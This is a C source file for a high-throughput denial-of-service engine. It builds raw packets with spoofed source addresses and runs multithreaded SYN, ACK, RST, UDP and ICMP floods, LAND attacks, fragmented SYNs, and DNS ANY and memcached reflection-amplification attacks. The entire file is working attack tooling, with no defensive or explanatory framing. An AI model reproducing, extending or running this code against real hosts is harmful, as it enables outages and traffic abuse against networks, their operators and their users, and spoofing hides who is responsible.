#define _GNU_SOURCE
#include "engine.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include <sched.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netdb.h>

#define PKT_MAX 65535
#define BATCH_SIZE 4096
#define MAX_WORKERS 128
#define BUF_RING_SZ 4096
#define BUF_SZ 128

int g_sock = -1;
static char g_err[256] = {0};
static uint32_t g_rng[128][4];
static __thread int g_tid = 0;
static uint32_t g_spoof_pool[4096];
static int g_spoof_count = 0;
static int g_raw_mode = 0;

static inline uint32_t xrand(void) {
    int i = g_tid & 127;
    uint32_t t = g_rng[i][0] ^ (g_rng[i][0] << 11);
    g_rng[i][0] = g_rng[i][1]; g_rng[i][1] = g_rng[i][2];
    g_rng[i][2] = g_rng[i][3];
    g_rng[i][3] = g_rng[i][3] ^ (g_rng[i][3] >> 19) ^ t ^ (t >> 8);
    return g_rng[i][3];
}

static inline uint32_t rand_spoof(void) {
    if (g_spoof_count > 0)
        return g_spoof_pool[xrand() % g_spoof_count];
    return xrand();
}

EXPORT void set_spoof_pool(uint32_t *pool, int count) {
    if (count > 4096) count = 4096;
    g_spoof_count = count;
    for (int i = 0; i < count; i++)
        g_spoof_pool[i] = pool[i];
}

EXPORT void seed_thread_rng(int tid, uint32_t seed) {
    g_tid = tid;
    int i = tid & 127;
    g_rng[i][0] = seed;
    g_rng[i][1] = seed * 2654435761u;
    g_rng[i][2] = seed * 2246822519u;
    g_rng[i][3] = seed * 3266489917u;
}

EXPORT const char *packet_error(void) { return g_err; }

EXPORT int init_raw_socket(void) {
    if (g_sock >= 0) close_raw_socket();
    g_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (g_sock < 0) {
        snprintf(g_err, sizeof(g_err), "socket: need root (CAP_NET_RAW)");
        return -1;
    }
    int on = 1;
    if (setsockopt(g_sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        snprintf(g_err, sizeof(g_err), "IP_HDRINCL: %s", strerror(errno));
        close_raw_socket(); return -1;
    }
    int sndbuf = 16 * 1024 * 1024;
    setsockopt(g_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    g_raw_mode = 1;
    return 0;
}

EXPORT int init_raw_socket_tid(int tid) {
    seed_thread_rng(tid, (uint32_t)(time(NULL) ^ (tid * 1234567)));
    return init_raw_socket();
}

EXPORT int init_udp_socket(void) {
    if (g_sock >= 0) close_raw_socket();
    g_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (g_sock < 0) { snprintf(g_err, sizeof(g_err), "socket: %s", strerror(errno)); return -1; }
    int sndbuf = 16 * 1024 * 1024;
    setsockopt(g_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    g_raw_mode = 0;
    return 0;
}

EXPORT int is_raw_mode(void) { return g_raw_mode; }
EXPORT void close_raw_socket(void) { if (g_sock >= 0) { close(g_sock); g_sock = -1; } }

EXPORT uint16_t calc_checksum(uint16_t *data, int len) {
    uint32_t sum = 0;
    for (int i = 0; i < len/2; i++) sum += data[i];
    if (len & 1) sum += ((uint8_t*)data)[len-1];
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

static inline uint32_t pseudo_csum(uint32_t src, uint32_t dst, uint8_t proto, uint16_t len) {
    uint32_t sum = 0;
    sum += (src >> 16) + (src & 0xFFFF);
    sum += (dst >> 16) + (dst & 0xFFFF);
    sum += (uint32_t)proto + (uint32_t)len;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return sum;
}

static inline uint16_t final_csum(uint32_t partial) {
    while (partial >> 16) partial = (partial & 0xFFFF) + (partial >> 16);
    return (uint16_t)~partial;
}

EXPORT uint32_t resolve_ip(const char *name) {
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(name, NULL, &hints, &res) != 0) {
        uint32_t a = inet_addr(name);
        if (a == INADDR_NONE) return 0;
        return a;
    }
    uint32_t ip = ((struct sockaddr_in*)res->ai_addr)->sin_addr.s_addr;
    freeaddrinfo(res);
    return ip;
}

static inline void fill_ip_fast(struct iphdr *ip, int tot_len, uint32_t src, uint32_t dst, uint8_t proto) {
    uint32_t saddr = src ? src : rand_spoof();
    ip->ihl = 5; ip->version = 4; ip->tot_len = htons(tot_len);
    ip->id = htons(xrand() & 0xFFFF);
    ip->frag_off = htons(0x4000);
    ip->ttl = 64 + (xrand() & 127);
    ip->tos = xrand() & 0xFF;
    ip->protocol = proto;
    ip->saddr = saddr;
    ip->daddr = dst;
    uint32_t ck = 0;
    uint16_t *w = (uint16_t*)ip;
    for (int i = 0; i < 5; i++) ck += w[i] + w[i+5];
    while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
    ip->check = (uint16_t)~ck;
}

static inline void build_syn_fast(char *buf, int *plen, uint32_t src, uint32_t target, uint16_t port) {
    struct iphdr *ip = (struct iphdr*)buf;
    struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
    uint8_t *opts = (uint8_t*)(buf + 20 + 20);
    int o = 0;
    opts[o++] = 2; opts[o++] = 4;
    uint16_t mss_val = htons(1460 - (xrand() & 63));
    memcpy(opts+o, &mss_val, 2); o += 2;
    opts[o++] = 3; opts[o++] = 3; opts[o++] = xrand() & 7;
    opts[o++] = 1;
    opts[o++] = 4; opts[o++] = 2;
    int pad = (4 - (o & 3)) & 3;
    for (int i = 0; i < pad; i++) opts[o++] = 1;
    int tcp_len = 20 + o;
    *plen = 20 + tcp_len;
    memset(tcp, 0, 20);
    tcp->source = htons((xrand() % 64511) + 1024);
    tcp->dest = htons(port);
    tcp->seq = xrand();
    tcp->doff = tcp_len/4;
    tcp->syn = 1;
    tcp->window = htons(65535);
    uint32_t saddr = src ? src : rand_spoof();
    uint32_t pseudo = (saddr >> 16) + (saddr & 0xFFFF) +
                      (target >> 16) + (target & 0xFFFF) +
                      IPPROTO_TCP + htons(tcp_len);
    while (pseudo >> 16) pseudo = (pseudo & 0xFFFF) + (pseudo >> 16);
    uint32_t csum = pseudo;
    uint16_t *tw = (uint16_t*)tcp;
    for (int i = 0; i < tcp_len/2; i++) csum += tw[i];
    while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16);
    tcp->check = (uint16_t)~csum;
    fill_ip_fast(ip, *plen, saddr, target, IPPROTO_TCP);
}

static inline void build_udp_fast(char *buf, int *plen, uint32_t src, uint32_t target, uint16_t port, int size) {
    if (size < 1) size = 1024;
    if (size > 65000) size = 65000;
    *plen = 20 + 8 + size;
    struct iphdr *ip = (struct iphdr*)buf;
    struct udphdr *udp = (struct udphdr*)(buf + 20);
    uint32_t saddr = src ? src : rand_spoof();
    udp->source = htons((xrand() % 64511) + 1024);
    udp->dest = htons(port);
    udp->len = htons(8 + size);
    udp->check = 0;
    uint32_t base = xrand();
    char *payload = buf + 28;
    for (int j = 0; j < size; j++)
        payload[j] = (base + j * 7) ^ (j * 13);
    fill_ip_fast(ip, *plen, saddr, target, IPPROTO_UDP);
}

static inline void build_icmp_fast(char *buf, int *plen, uint32_t src, uint32_t target) {
    *plen = 20 + 8 + 56;
    struct iphdr *ip = (struct iphdr*)buf;
    struct icmphdr *icmp = (struct icmphdr*)(buf + 20);
    uint32_t saddr = src ? src : rand_spoof();
    memset(buf + 20, 0, 64);
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = saddr;
    ip->daddr = target;
    icmp->type = ICMP_ECHO;
    uint32_t csum = 0;
    uint16_t *iw = (uint16_t*)icmp;
    for (int i = 0; i < 32; i++) csum += iw[i];
    while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16);
    icmp->checksum = (uint16_t)~csum;
    fill_ip_fast(ip, *plen, saddr, target, IPPROTO_ICMP);
}

static inline void build_ack_fast(char *buf, int *plen, uint32_t src, uint32_t target, uint16_t port) {
    build_syn_fast(buf, plen, src, target, port);
    struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
    tcp->syn = 0; tcp->ack = 1;
    tcp->ack_seq = xrand();
    struct iphdr *ip = (struct iphdr*)buf;
    uint32_t saddr = ip->saddr;
    int tcp_len = tcp->doff * 4;
    uint32_t pseudo = (saddr >> 16) + (saddr & 0xFFFF) +
                      (target >> 16) + (target & 0xFFFF) +
                      IPPROTO_TCP + htons(tcp_len);
    while (pseudo >> 16) pseudo = (pseudo & 0xFFFF) + (pseudo >> 16);
    uint32_t csum = pseudo;
    uint16_t *tw = (uint16_t*)tcp;
    for (int i = 0; i < tcp_len/2; i++) csum += tw[i];
    while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16);
    tcp->check = (uint16_t)~csum;
}

static inline void build_rst_fast(char *buf, int *plen, uint32_t src, uint32_t target, uint16_t port) {
    build_syn_fast(buf, plen, src, target, port);
    struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
    tcp->syn = 0; tcp->rst = 1;
    struct iphdr *ip = (struct iphdr*)buf;
    uint32_t saddr = ip->saddr;
    int tcp_len = tcp->doff * 4;
    uint32_t pseudo = (saddr >> 16) + (saddr & 0xFFFF) +
                      (target >> 16) + (target & 0xFFFF) +
                      IPPROTO_TCP + htons(tcp_len);
    while (pseudo >> 16) pseudo = (pseudo & 0xFFFF) + (pseudo >> 16);
    uint32_t csum = pseudo;
    uint16_t *tw = (uint16_t*)tcp;
    for (int i = 0; i < tcp_len/2; i++) csum += tw[i];
    while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16);
    tcp->check = (uint16_t)~csum;
}

static inline void build_land_fast(char *buf, int *plen, uint32_t target, uint16_t port) {
    build_syn_fast(buf, plen, target, target, port);
}

/* Pre-allocated buffer ring per worker */
struct buf_ring {
    char data[BUF_RING_SZ][BUF_SZ];
    int lens[BUF_RING_SZ];
    struct sockaddr_in dsts[BUF_RING_SZ];
    int head;
    int count;
};

struct thread_worker {
    int sock;
    int running;
    pthread_t thread;
    uint64_t sent;
    uint32_t target_ip;
    uint16_t target_port;
    int method;
    int size;
    int duration_sec;
    uint32_t spoof_base;
    int cpu_core;
    struct buf_ring ring;
};

static int g_pool_running[4] = {0,0,0,0};
static struct thread_worker *g_pools[4] = {NULL, NULL, NULL, NULL};
static int g_pool_offsets[4] = {0,0,0,0};
static int g_pool_capacities[4] = {0,0,0,0};

static int try_raw_sock(void) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) return -1;
    int on = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    int sndbuf = 16 * 1024 * 1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    return s;
}

static int try_dgram_sock(void) {
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return -1;
    int sndbuf = 16 * 1024 * 1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    return s;
}

static void *worker_loop(void *arg) {
    struct thread_worker *w = (struct thread_worker*)arg;
    (void)w;
    static int g_gtid = 0;
    int tid = __atomic_fetch_add(&g_gtid, 1, __ATOMIC_RELAXED);
    seed_thread_rng(tid, (uint32_t)(time(NULL) ^ (tid * 1234567)));

    if (w->cpu_core >= 0) {
        cpu_set_t cpuset;
        CPU_ZERO(&cpuset);
        CPU_SET(w->cpu_core, &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
    }

    /* Try raw socket first (needs root), fall back to DGRAM for UDP/ICMP */
    int sock = try_raw_sock();
    int is_dgram = 0;
    if (sock < 0) {
        /* Raw socket failed — try DGRAM for non-TCP methods */
        if (w->method == 1 || w->method == 4) {  /* UDP or ICMP */
            sock = try_dgram_sock();
            if (sock < 0) { w->running = 0; return NULL; }
            is_dgram = 1;
        } else {
            /* TCP methods (SYN/ACK/RST) require raw socket */
            w->running = 0;
            return NULL;
        }
    }
    w->sock = sock;

    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iovecs[BATCH_SIZE];
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(w->target_port);
    dst.sin_addr.s_addr = w->target_ip;

    struct timespec ts_end;
    clock_gettime(CLOCK_MONOTONIC, &ts_end);
    ts_end.tv_sec += w->duration_sec;

    struct buf_ring *ring = &w->ring;
    ring->head = 0;
    ring->count = 0;

    char *big_buf = NULL;
    int big_len = 0;

    while (w->running) {
        struct timespec ts_now;
        clock_gettime(CLOCK_MONOTONIC, &ts_now);
        if (ts_now.tv_sec > ts_end.tv_sec ||
            (ts_now.tv_sec == ts_end.tv_sec && ts_now.tv_nsec >= ts_end.tv_nsec))
            break;

        int batch = 0;
        if (is_dgram) {
            /* DGRAM mode: send raw UDP payloads, kernel adds IP/UDP headers */
            while (batch < BATCH_SIZE) {
                int idx = (ring->head + batch) % BUF_RING_SZ;
                char *buf = ring->data[idx];
                int plen = w->size;
                if (plen < 1) plen = 64;
                if (plen > BUF_SZ) plen = BUF_SZ;
                uint32_t base = xrand();
                for (int j = 0; j < plen; j++)
                    buf[j] = (base + j * 7) ^ (j * 13);
                ring->lens[idx] = plen;
                iovecs[batch].iov_base = buf;
                iovecs[batch].iov_len = plen;
                msgs[batch].msg_hdr.msg_name = &dst;
                msgs[batch].msg_hdr.msg_namelen = sizeof(dst);
                msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
                msgs[batch].msg_hdr.msg_iovlen = 1;
                batch++;
            }
        } else {
            /* Raw socket mode: build complete IP packets */
            while (batch < BATCH_SIZE) {
                int idx = (ring->head + batch) % BUF_RING_SZ;
                char *buf = ring->data[idx];
                int plen;
                int need_big = 0;
                uint32_t src = w->spoof_base ? w->spoof_base : rand_spoof();
                switch (w->method) {
                case 0: build_syn_fast(buf, &plen, src, w->target_ip, w->target_port); break;
                case 1:
                    if (w->size + 28 > BUF_SZ) { need_big = 1; break; }
                    build_udp_fast(buf, &plen, src, w->target_ip, w->target_port, w->size); break;
                case 2: build_ack_fast(buf, &plen, src, w->target_ip, w->target_port); break;
                case 3: build_rst_fast(buf, &plen, src, w->target_ip, w->target_port); break;
                case 4: build_icmp_fast(buf, &plen, src, w->target_ip); break;
                case 10: build_land_fast(buf, &plen, w->target_ip, w->target_port); break;
                default:
                    if (w->size + 28 > BUF_SZ) { need_big = 1; break; }
                    build_udp_fast(buf, &plen, src, w->target_ip, w->target_port, w->size); break;
                }
                if (need_big) {
                    if (!big_buf || big_len < w->size + 28) {
                        free(big_buf);
                        big_len = w->size + 28 + 64;
                        big_buf = (char*)malloc(big_len);
                    }
                    if (!big_buf) break;
                    buf = big_buf;
                    build_udp_fast(buf, &plen, src, w->target_ip, w->target_port, w->size);
                }
                ring->lens[idx] = plen;
                ring->dsts[idx] = dst;
                iovecs[batch].iov_base = need_big ? big_buf : (void*)buf;
                iovecs[batch].iov_len = plen;
                msgs[batch].msg_hdr.msg_name = &ring->dsts[idx];
                msgs[batch].msg_hdr.msg_namelen = sizeof(ring->dsts[idx]);
                msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
                msgs[batch].msg_hdr.msg_iovlen = 1;
                batch++;
            }
        }
        if (batch == 0) break;
        int ret = sendmmsg(sock, msgs, batch, MSG_DONTWAIT);
        if (ret > 0) {
            w->sent += ret;
            ring->head = (ring->head + ret) % BUF_RING_SZ;
        } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            break;
        }
    }
    free(big_buf);
    close(sock);
    w->running = 0;
    return NULL;
}

static int method_pool(int m) {
    if (m == 0 || m == 10) return 0;  /* SYN + LAND */
    if (m == 1) return 1;              /* UDP */
    if (m == 2) return 2;              /* ACK */
    return 3;                          /* RST, ICMP, others */
}

EXPORT int start_batch_flood(uint32_t target_ip, uint16_t target_port, int method, int workers, int size, int duration_sec) {
    int pool_id = method_pool(method);
    if (g_pool_running[pool_id]) return -1;
    if (workers > MAX_WORKERS) workers = MAX_WORKERS;
    if (workers > g_pool_capacities[pool_id]) {
        free(g_pools[pool_id]);
        g_pools[pool_id] = (struct thread_worker*)calloc(workers, sizeof(struct thread_worker));
        g_pool_capacities[pool_id] = workers;
        if (!g_pools[pool_id]) return -1;
    }
    g_pool_running[pool_id] = 1;
    g_pool_offsets[pool_id] = workers;
    struct thread_worker *pool = g_pools[pool_id];
    int ncpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpus < 1) ncpus = 1;
    for (int i = 0; i < workers; i++) {
        memset(&pool[i], 0, sizeof(pool[i]));
        pool[i].running = 1;
        pool[i].target_ip = target_ip;
        pool[i].target_port = target_port;
        pool[i].method = method;
        pool[i].size = size;
        pool[i].duration_sec = duration_sec;
        pool[i].sent = 0;
        pool[i].spoof_base = 0;
        pool[i].cpu_core = i % ncpus;
        pthread_create(&pool[i].thread, NULL, worker_loop, &pool[i]);
    }
    return workers;
}

EXPORT int stop_batch_flood(void) {
    for (int p = 0; p < 4; p++) {
        if (!g_pool_running[p]) continue;
        struct thread_worker *pool = g_pools[p];
        for (int i = 0; i < g_pool_offsets[p]; i++)
            pool[i].running = 0;
        for (int i = 0; i < g_pool_offsets[p]; i++) {
            if (pool[i].thread) {
                pthread_join(pool[i].thread, NULL);
                pool[i].thread = 0;
            }
        }
        g_pool_running[p] = 0;
        g_pool_offsets[p] = 0;
    }
    return 0;
}

EXPORT uint64_t batch_flood_sent(void) {
    uint64_t total = 0;
    for (int p = 0; p < 4; p++) {
        struct thread_worker *pool = g_pools[p];
        if (!pool) continue;
        for (int i = 0; i < g_pool_offsets[p]; i++)
            total += pool[i].sent;
    }
    return total;
}

/* Legacy functions (optimized wrappers) */
EXPORT int syn_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay) {
    char buf[PKT_MAX]; int plen;
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    for (int i = 0; i < count; i++) {
        uint32_t src = spoof ? spoof : rand_spoof();
        build_syn_fast(buf, &plen, src, target, port);
        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
        if (delay) usleep(delay);
    }
    return sent;
}

EXPORT int udp_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay, int size) {
    char buf[PKT_MAX]; int plen;
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    for (int i = 0; i < count; i++) {
        uint32_t src = spoof ? spoof : rand_spoof();
        build_udp_fast(buf, &plen, src, target, port, size);
        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
        if (delay) usleep(delay);
    }
    return sent;
}

EXPORT int ack_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay) {
    char buf[PKT_MAX]; int plen;
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    for (int i = 0; i < count; i++) {
        uint32_t src = spoof ? spoof : rand_spoof();
        build_ack_fast(buf, &plen, src, target, port);
        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
        if (delay) usleep(delay);
    }
    return sent;
}

EXPORT int rst_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay) {
    char buf[PKT_MAX]; int plen;
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    for (int i = 0; i < count; i++) {
        uint32_t src = spoof ? spoof : rand_spoof();
        build_rst_fast(buf, &plen, src, target, port);
        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
        if (delay) usleep(delay);
    }
    return sent;
}

EXPORT int icmp_flood(uint32_t target, uint32_t spoof, int count, int delay) {
    char buf[PKT_MAX]; int plen;
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_addr.s_addr = target;
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    for (int i = 0; i < count; i++) {
        uint32_t src = spoof ? spoof : rand_spoof();
        build_icmp_fast(buf, &plen, src, target);
        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
        if (delay) usleep(delay);
    }
    return sent;
}

/* Amplification */
static uint16_t dns_id = 0xDEAD;

EXPORT int dns_any_amp(uint32_t target, uint32_t spoof, const char *server, int count, int delay) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(53);
    dst.sin_addr.s_addr = resolve_ip(server);
    if (dst.sin_addr.s_addr == 0) { close(sock); return -1; }

    unsigned char qbuf[64];
    uint32_t src = spoof ? spoof : rand_spoof();
    int sent = 0;
    for (int i = 0; i < count; i++) {
        memset(qbuf, 0, 64);
        dns_id++;
        qbuf[0] = (dns_id >> 8) & 0xFF; qbuf[1] = dns_id & 0xFF;
        qbuf[2] = 0x01; qbuf[3] = 0x00;
        qbuf[4] = 0x00; qbuf[5] = 0x01;
        qbuf[6] = 0x00; qbuf[7] = 0x00;
        qbuf[8] = 0x00; qbuf[9] = 0x00;
        qbuf[10] = 0x00; qbuf[11] = 0x00;
        int off = 12;
        const char *labels[] = {"isc", "org", NULL};
        for (int l = 0; labels[l]; l++) {
            int ll = strlen(labels[l]);
            qbuf[off++] = ll;
            memcpy(qbuf + off, labels[l], ll);
            off += ll;
        }
        qbuf[off++] = 0x00;
        qbuf[off++] = 0x00; qbuf[off++] = 0xFF;
        qbuf[off++] = 0x00; qbuf[off++] = 0x01;

        if (g_raw_mode) {
            char pkt[PKT_MAX];
            int plen = 20 + 8 + off;
            struct iphdr *ip = (struct iphdr*)pkt;
            struct udphdr *udp = (struct udphdr*)(pkt + 20);
            memset(pkt, 0, plen);
            fill_ip_fast(ip, plen, src, dst.sin_addr.s_addr, IPPROTO_UDP);
            udp->source = htons((xrand() % 64511) + 1024);
            udp->dest = htons(53);
            udp->len = htons(8 + off);
            memcpy(pkt + 28, qbuf, off);
            sendto(g_sock, pkt, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
        } else {
            sendto(sock, qbuf, off, 0, (struct sockaddr*)&dst, sizeof(dst));
        }
        sent++;
        if (delay) usleep(delay);
    }
    close(sock);
    return sent;
}

EXPORT int memcached_amp(uint32_t target, uint32_t spoof, const char *server, int count, int delay) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(11211);
    dst.sin_addr.s_addr = resolve_ip(server);
    if (dst.sin_addr.s_addr == 0) { close(sock); return -1; }

    unsigned char req[] = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n";
    int reqlen = 15;
    uint32_t src = spoof ? spoof : rand_spoof();
    int sent = 0;
    for (int i = 0; i < count; i++) {
        if (g_raw_mode) {
            char pkt[PKT_MAX];
            int plen = 20 + 8 + reqlen;
            struct iphdr *ip = (struct iphdr*)pkt;
            struct udphdr *udp = (struct udphdr*)(pkt + 20);
            memset(pkt, 0, plen);
            fill_ip_fast(ip, plen, src, dst.sin_addr.s_addr, IPPROTO_UDP);
            udp->source = htons((xrand() % 64511) + 1024);
            udp->dest = htons(11211);
            udp->len = htons(8 + reqlen);
            memcpy(pkt + 28, req, reqlen);
            sendto(g_sock, pkt, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
        } else {
            sendto(sock, req, reqlen, 0, (struct sockaddr*)&dst, sizeof(dst));
        }
        sent++;
        if (delay) usleep(delay);
    }
    close(sock);
    return sent;
}

/* IP fragmentation */
EXPORT int send_fragmented_syn(uint32_t target, uint16_t port, uint32_t spoof) {
    char buf[PKT_MAX]; int plen;
    uint32_t src = spoof ? spoof : rand_spoof();
    build_syn_fast(buf, &plen, src, target, port);
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    if (g_sock < 0) return -1;
    uint16_t ip_id = xrand() & 0xFFFF;
    int frag_size = plen / 2;
    struct iphdr *ip = (struct iphdr*)buf;
    ip->id = htons(ip_id);
    ip->frag_off = htons(0x2000);
    ip->tot_len = htons(frag_size);
    uint32_t ck = 0; uint16_t *w = (uint16_t*)ip;
    for (int i = 0; i < 5; i++) ck += w[i] + w[i+5];
    while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
    ip->check = (uint16_t)~ck;
    sendto(g_sock, buf, frag_size, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
    memmove(buf, buf + frag_size, plen - frag_size);
    memset(buf + (plen - frag_size), 0, frag_size);
    ip = (struct iphdr*)buf;
    ip->id = htons(ip_id);
    ip->frag_off = htons(0);
    ip->tot_len = htons(plen - frag_size);
    ck = 0; w = (uint16_t*)ip;
    for (int i = 0; i < 5; i++) ck += w[i] + w[i+5];
    while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
    ip->check = (uint16_t)~ck;
    sendto(g_sock, buf, plen - frag_size, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
    return 2;
}

/* LAND attack */
EXPORT int land_attack(uint32_t target, uint16_t port, int count) {
    char buf[PKT_MAX]; int plen;
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    for (int i = 0; i < count; i++) {
        build_syn_fast(buf, &plen, target, target, port);
        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
    }
    return sent;
}

EXPORT int syn_flood_raw(uint32_t target, uint16_t port, uint32_t spoof, int count) {
    return syn_flood(target, port, spoof, count, 0);
}
